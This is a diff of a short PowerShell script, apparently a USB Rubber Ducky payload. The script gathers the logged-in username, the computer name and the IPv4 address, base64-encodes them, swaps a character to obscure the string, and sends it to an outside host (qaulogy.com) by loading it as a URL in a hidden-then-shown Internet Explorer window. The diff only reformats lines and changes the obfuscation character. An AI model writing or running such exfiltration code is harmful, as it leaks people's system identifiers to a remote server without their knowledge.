@@ -1,8 +1,8 @@
-$var = " ducky123;" + $env:USERNAME + " ;" + $env:COMPUTERNAME + " ;"
+$var = " ducky123;" + $env:USERNAME + " ;" + $env:COMPUTERNAME + " ;";
 $ip = Test-Connection -ComputerName $env:COMPUTERNAME -Count 1  | Select IPV4Address ;
-$var += $ip.IPV4Address.IPAddressToString
-$var = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($var))
-$var = $var.replace('A', '#')
-$IE=new-object -com internetexplorer.application
+$var += $ip.IPV4Address.IPAddressToString;
+$var = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($var));
+$var = $var.replace('B', '_');
+$IE=new-object -com internetexplorer.application;
 $IE.navigate2(" https://www.qaulogy.com/ducky/ducky/" + $var);
-$IE.visible=$true
+$IE.visible=$true;
